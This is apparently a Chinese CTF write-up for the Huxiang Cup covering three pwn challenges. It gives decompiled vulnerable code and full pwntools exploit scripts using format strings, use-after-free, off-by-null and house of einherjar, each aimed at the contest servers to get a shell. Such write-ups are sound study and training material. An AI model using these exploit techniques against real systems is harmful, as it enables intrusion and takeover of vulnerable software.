# 湖湘杯

## 0x01前言



这一次比赛可惜没有过初赛的理论赛都没过，没注意湖湘杯理论赛。~~~~今天打这个湖湘杯, 我的师傅与我的同学都进线下了....@_@。不管怎样，下次好好加油，总之今天还不错，干了3道pwn，总的有4道。。。这次比赛出现简单题目分值高，怪了。。。



## pwn1 [pwn_printf]

[下载]()

保护

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

主函数如下

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-100A8h]
  __int64 v5; // [rsp+10h] [rbp-100A0h]
  __int64 v6; // [rsp+18h] [rbp-10098h]
  __int64 v7; // [rsp+20h] [rbp-10090h]
  __int64 v8; // [rsp+28h] [rbp-10088h]
  __int64 v9; // [rsp+30h] [rbp-10080h]
  __int64 v10; // [rsp+38h] [rbp-10078h]
  __int64 v11; // [rsp+40h] [rbp-10070h]
  unsigned __int16 *vul_size; // [rsp+48h] [rbp-10068h]
  char v13; // [rsp+60h] [rbp-10050h]
  char *format; // [rsp+10068h] [rbp-48h]
  void *dest; // [rsp+10070h] [rbp-40h]
  int v16; // [rsp+10078h] [rbp-38h]
  int i; // [rsp+1007Ch] [rbp-34h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  dest = mmap((void *)0x4000000, 0x4000000uLL, 3, 34, -1, 0LL);
  memcpy(dest, "%1$00038s%3$hn%1$65498s%1$57344s%7$hn", 0x50uLL);
  memcpy((char *)dest + 74, "%1$00121s%3$hn%1$65415s%1$57344s%1$00064s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 121, "%1$00164s%3$hn%1$65372s%1$*5$s%1$*8$s%9$hn", 0x2BuLL);
  memcpy((char *)dest + 164, "%1$00209s%3$hn%1$65327s%1$*8$s%1$65432s%9$hn", 0x2DuLL);
  memcpy((char *)dest + 209, "%8$c%1$01889s%2$c%4$s%1$63890s%3$hn", 0x24uLL);
  memcpy((char *)dest + 245, "%1$00292s%3$hn%1$65244s%1$57344s%1$00008s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 292, "%1$00330s%3$hn%1$65206s%1$*5$s%11$hn", 0x25uLL);
  memcpy((char *)dest + 330, "%1$00377s%3$hn%1$65159s%1$57344s%1$00096s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 377, "%1$00425s%3$hn%1$65111s%1$*5$s%1$*10$s%11$hn", 0x2DuLL);
  memcpy((char *)dest + 425, "%1$00472s%3$hn%1$65064s%1$*10$s%1$65439s%11$hn", 0x2FuLL);
  memcpy((char *)dest + 472, "%10$c%1$01625s%2$c%4$s%1$64418s%3$hn", 0x25uLL);
  memcpy((char *)dest + 509, "%1$00556s%3$hn%1$64980s%1$57344s%1$00016s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 556, "%1$00593s%3$hn%1$64943s%1$*5$s%13$hn", 0x25uLL);
  memcpy((char *)dest + 593, "%1$00645s%3$hn%1$64891s%1$57344s%1$00048s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 645, "%1$00690s%3$hn%1$64846s%1$*5$s%1$*12$s%13$hn", 0x2DuLL);
  memcpy((char *)dest + 690, "%1$00737s%3$hn%1$64799s%1$*12$s%1$65424s%13$hn", 0x2FuLL);
  memcpy((char *)dest + 737, "%12$c%1$01360s%2$c%4$s%1$64948s%3$hn", 0x25uLL);
  memcpy((char *)dest + 774, "%1$00821s%3$hn%1$64715s%1$57344s%1$00024s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 821, "%1$00858s%3$hn%1$64678s%1$*5$s%15$hn", 0x25uLL);
  memcpy((char *)dest + 858, "%1$00905s%3$hn%1$64631s%1$57344s%1$00120s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 905, "%1$00950s%3$hn%1$64586s%1$*5$s%1$*14$s%15$hn", 0x2DuLL);
  memcpy((char *)dest + 950, "%1$00997s%3$hn%1$64539s%1$*14$s%1$65424s%15$hn", 0x2FuLL);
  memcpy((char *)dest + 997, "%14$c%1$01097s%2$c%4$s%1$65474s%3$hn", 0x25uLL);
  memcpy((char *)dest + 1037, "%1$01084s%3$hn%1$64452s%1$57344s%1$00032s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1084, "%1$01121s%3$hn%1$64415s%1$*5$s%17$hn", 0x25uLL);
  memcpy((char *)dest + 1121, "%1$01168s%3$hn%1$64368s%1$57344s%1$00112s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1168, "%1$01215s%3$hn%1$64321s%1$*5$s%1$*16$s%17$hn", 0x2DuLL);
  memcpy((char *)dest + 1215, "%1$01262s%3$hn%1$64274s%1$*16$s%1$65415s%17$hn", 0x2FuLL);
  memcpy((char *)dest + 1262, "%16$c%1$00835s%2$c%4$s%1$00462s%3$hn", 0x25uLL);
  memcpy((char *)dest + 1299, "%1$01346s%3$hn%1$64190s%1$57344s%1$00040s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1346, "%1$01383s%3$hn%1$64153s%1$*5$s%19$hn", 0x25uLL);
  memcpy((char *)dest + 1383, "%1$01430s%3$hn%1$64106s%1$57344s%1$00056s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1430, "%1$01475s%3$hn%1$64061s%1$*5$s%1$*18$s%19$hn", 0x2DuLL);
  memcpy((char *)dest + 1475, "%1$01522s%3$hn%1$64014s%1$*18$s%1$65424s%19$hn", 0x2FuLL);
  memcpy((char *)dest + 1522, "%18$c%1$00575s%2$c%4$s%1$00982s%3$hn", 0x25uLL);
  memcpy((char *)dest + 1559, "%1$01606s%3$hn%1$63930s%1$57344s%1$00072s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1606, "%1$01643s%3$hn%1$63893s%1$*5$s%21$hn", 0x25uLL);
  memcpy((char *)dest + 1643, "%1$01690s%3$hn%1$63846s%1$57344s%1$00088s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1690, "%1$01735s%3$hn%1$63801s%1$*5$s%1$*20$s%21$hn", 0x2DuLL);
  memcpy((char *)dest + 1735, "%1$01782s%3$hn%1$63754s%1$*20$s%1$65417s%21$hn", 0x2FuLL);
  memcpy((char *)dest + 1782, "%20$c%1$00315s%2$c%4$s%1$01502s%3$hn", 0x25uLL);
  memcpy((char *)dest + 1819, "%1$01866s%3$hn%1$63670s%1$57344s%1$00080s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1866, "%1$01906s%3$hn%1$63630s%1$*5$s%23$hn", 0x25uLL);
  memcpy((char *)dest + 1906, "%1$01953s%3$hn%1$63583s%1$57344s%1$00104s%7$hn", 0x2FuLL);
  memcpy((char *)dest + 1953, "%1$01998s%3$hn%1$63538s%1$*5$s%1$*22$s%23$hn", 0x2DuLL);
  memcpy((char *)dest + 1998, "%1$02045s%3$hn%1$63491s%1$*22$s%1$65426s%23$hn", 0x2FuLL);
  memcpy((char *)dest + 2045, "%22$c%1$00052s%2$c%4$s%1$02028s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2082, "%1$02120s%3$hn%1$63416s%1$00032s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2120, "%1$65534s%3$hn", 0xFuLL);
  memcpy((char *)dest + 2135, "%8$c%1$00525s%2$c%4$s%1$01644s%3$hn", 0x24uLL);
  memcpy((char *)dest + 2171, "%1$02209s%3$hn%1$63327s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2209, "%10$c%1$00450s%2$c%4$s%1$01794s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2246, "%1$02284s%3$hn%1$63252s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2284, "%12$c%1$00374s%2$c%4$s%1$01946s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2322, "%1$02360s%3$hn%1$63176s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2360, "%14$c%1$00299s%2$c%4$s%1$02096s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2397, "%1$02435s%3$hn%1$63101s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2435, "%16$c%1$00224s%2$c%4$s%1$02246s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2472, "%1$02510s%3$hn%1$63026s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2510, "%18$c%1$00149s%2$c%4$s%1$02396s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2547, "%1$02585s%3$hn%1$62951s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2585, "%20$c%1$00074s%2$c%4$s%1$02546s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2622, "%1$02660s%3$hn%1$62876s%1$00004s%6$hn", 0x26uLL);
  memcpy((char *)dest + 2660, "%22$c%1$65535s%2$c%4$s%1$02696s%3$hn", 0x25uLL);
  memcpy((char *)dest + 2697, "%1$65534s%3$hn", 0xFuLL);
  v11 = 0LL;
  v10 = 0LL;
  v9 = 0LL;
  v8 = 0LL;
  v7 = 0LL;
  v6 = 0LL;
  v5 = 0LL;
  v4 = 0LL;
  format = (char *)dest;
  vul_size = (unsigned __int16 *)dest;
  puts("What the f**k printf?\n");
  puts("Try to input something");
  puts("You will find this game very interesting");
  for ( i = 0; i <= 15; ++i )                   // input 16 times
    __isoc99_scanf("%d", (char *)dest + 8 * i + 57344);
  v16 = 0;
  while ( (char *)dest + 65534 != format )
  {
    sprintf(
      (char *)0x6000000,
      format,
      &v13,
      0LL,
      &format,
      100663296LL,
      *vul_size,
      vul_size,
      &vul_size,
      v11,
      &v11,
      v10,
      &v10,
      v9,
      &v9,
      v8,
      &v8,
      v7,
      &v7,
      v6,
      &v6,
      v5,
      &v5,
      v4,
      &v4);
    ++v16;
  }
  if ( *vul_size <= 0x20u )
    read_vul(*vul_size);
  else
    puts("Please try again and you will get it");
  puts("Sorry you are out");
  return 0LL;
}
```

一堆格式化字符串，输入一些数值, 会取出相应的字符串来进行格式化处理，在处理完之后，调用输入函数，输入函数如下。

```c
ssize_t __fastcall read_vul(unsigned __int16 a1)
{
  __int64 savedregs; // [rsp+10h] [rbp+0h]

  return read(0, &savedregs, 2 * a1);           // vul
}
```

在进行第9次输入的时候，输入的值直接可修改size变量，修改为大于0x5的即可实现堆栈溢出，直接采用ret2libc打法。

### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'pwn_printf'
libc_path = './libc.so.6'

# remote server ip and port
server_ip = "47.111.96.55"
server_port = 54506

# if local debug
LOCAL = 0
LIBC  = 0

#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)


#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	for _ in range(8):
		sl('0')
	sl(str(0x20)) # set size
	for _ in range(7):
		sl('0')
	pop_rdi = 0x401213
	start = 0x4007EF
	vul_read = 0x4007C6
	p = p64(0) # rbp
	p += p64(pop_rdi)
	p += p64(elf.got['read'])
	p += p64(elf.plt['puts'])
	p += p64(pop_rdi)
	p += p64(0x40)
	p += p64(vul_read)
	s(p)
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
	libc_base = leak - 0x0f7310
	li('libc_base: ' + hex(libc_base))

	db()
	p = p64(0)
	p += p64(pop_rdi)
	p += p64(libc_base + 0x18ce17)
	p += p64(libc_base + 0x0453a0)
	s(p)

	

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_PRELOAD" : libc_path} )
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```







## pwn2  [blend_pwn]

该程序漏洞比较多，需要各个漏洞结合起来打。



###  vul1

字符串漏洞

```c
int show_user()
{
  return printf(byte_202080);                   // vul
}
```



### vul2

uaf漏洞，释放内存后指针没有清0

```c
__int64 del()
{
  int index; // [rsp+Ch] [rbp-4h]

  printf("index>");
  index = input_n();
  if ( index < 0 || index > 1 )
  {
    puts("Insufficient space");
    exit(0);
  }
  if ( ptr_arr[index] )
  {
    free((void *)ptr_arr[index]);
    puts("down!");
  }
  else
  {
    puts("fail!");
  }
  return 0LL;
}
```



### vul3

堆栈溢出可修改rbp，在捕获异常后可实现堆栈迁移。

```c
unsigned __int64 gift()
{
  _QWORD *v0; // rax
  char v2; // [rsp+10h] [rbp-20h] vul
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Please input what you want:");
  if ( (signed int)readn(&v2, 0x28) > 0x10 )
  {
    v0 = (_QWORD *)_cxa_allocate_exception(8LL);
    *v0 = "You are too young!";
    _cxa_throw((__int64)v0, (__int64)&`typeinfo for'char const*, 0LL);
  }
  return __readfsqword(0x28u) ^ v3;
}
```



### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')

context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'blend_pwn'
libc_path = './libc.so.6'
libs_path = '~/pwn-lib/2.23'

# remote server ip and port
server_ip = "47.111.96.55"
server_port = 52704

# if local debug
LOCAL = 1
LIBC  = 0

#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def shu():
	sla('>', '1')
	
def ad(d):
	sla('>', '2')
	sla(':', d)

def rm(i):
	sla('>', '3')
	sla('>', str(i))

def dp():
	sla('>', '4')

def gift(d):
	sla('>', '666')
	sla('want:', d)
	
#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	dp()
	sla(':', '%p%p')
	shu()
	ru('0x')
	leak = int(r(12), 16)
	li('leak: ' + hex(leak))
	ru('0x')
	leak = int(r(12), 16)
	libc_base = leak - 0x3c6780
	li('libc_base: ' + hex(libc_base))
	one_gadget = libc_base + 0x45226

	p = p64(0) * 3
	p += p64(one_gadget)
	ad(p)
	ad('A')

	rm(0)
	rm(1)
	# leak heap
	ru('\n')
	heap_leak = u64(ru('\n')[-6:].ljust(8, b'\x00'))
	li('leak: ' + hex(heap_leak))
	
	p = b'A' * 0x20
	p += p64(heap_leak + 0x20)
	p += b'A' * 0x9
	gift(p)

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD":libc_path})
		else:
			io = elf.process()
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```





## pwn3 [babyheap]

保护

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```



### vul

off by null漏洞

```c
char *__fastcall safe_read(char *a1, int a2)
{
  char *result; // rax

  read(0, a1, 0xF0uLL);
  result = &a1[a2];
  *result = 0;                                  // off by null
  return result;
}
```



### 思路

这个题只要实现堆重叠即可任意地址开辟写入，采用house of einherjar 来实现，但是需要伪造堆块，绕过unlink检查，修改free_hook为system函数。



```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: i0gan
# Env: Linux arch 5.8.14-arch1-1

from pwn import *
import os

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li  = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')


context.log_level='debug'
context.terminal = ['tmux', 'splitw', '-h']

elf_path  = 'pwn'
MODIFY_LD = 0
arch = '64'
libc_v = '2.27'

ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
libc_path = './libc.so.6'

# change ld path 
if(MODIFY_LD):
	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
	os.system(change_ld_cmd)
	li('modify ld ok!')
	exit(0)

# remote server ip and port
server_ip = "47.111.104.99"
server_port = 52403

# if local debug
LOCAL = 0
LIBC  = 1


#--------------------------func-----------------------------
def db():
	if(LOCAL):
		gdb.attach(io)

def ad():
	sla('>>', '1')

def dp(idx):
	sla('>>', '2')
	sla('?', str(idx))

def md(i, s, d):
	sla('>>', '3')
	sla('?', str(i))
	sla(':', str(s))
	sa(':', d)

def rm(i):	
	sla('>>', '4')
	sla('?', str(i))
	
def q():
	sla('>>', '5')

#--------------------------exploit--------------------------
def exploit():
	li('exploit...')
	ad()
	ad()
	md(0, 0xF8, 'A' * 0xF8)
	md(0, 0xF8, 'A' * 0xF8)

	rm(0)
	rm(1)
	ad()
	dp(0)
	# leak heap
	ru('\n')
	leak = u64(ru('\nD').ljust(8, b'\x00'))
	heap_base = leak - 0x260
	li('heap_base : ' + hex(heap_base))
	rm(0)

	# leak libc
	for _ in range(10):
		ad()
	for i in range(10):
		rm(i)
	for _ in range(10):
		ad()

	dp(7)
	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')

	main_arena = 0x3afc40
	main_arena = 0x3ebc40
	libc_base = leak - main_arena - 96
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']
	li('libc_base: ' + hex(libc_base))

	for i in range(7):
		md(i, 10, '\x00' * 8 + str(i))
		rm(i)
	overlap = heap_base + 0xa50
	#rm(7)
	# passby unlink
	md(7, 0xf8, p64(heap_base + 0xb50) + p64(heap_base + 0xb50)) # merge to this

	md(8, 0x10, 'BBBB')
	p = p64(heap_base + 0x950)
	p += p64(heap_base + 0x950)
	md(9, 0x10, p)
	rm(8) # house of einherjar

	for _ in range(7):
		ad()

	ad() # index 7
	md(7, 0x10, 'AA')
	rm(7)
	md(8, 0x10, p64(free_hook))

	ad() # index 9
	ad() # index 10
	md(10, 0x10, p64(system))
	
	md(9, 0x10, '/bin/sh\x00')
	#db()
	rm(9)

def finish():
	ia()
	c()

#--------------------------main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		elf = ELF(elf_path)
		if LIBC:
			libc = ELF(libc_path)
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
		else:
			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
	
	else:
		elf = ELF(elf_path)
		io = remote(server_ip, server_port)
		if LIBC:
			libc = ELF(libc_path)

	exploit()
	finish()
```

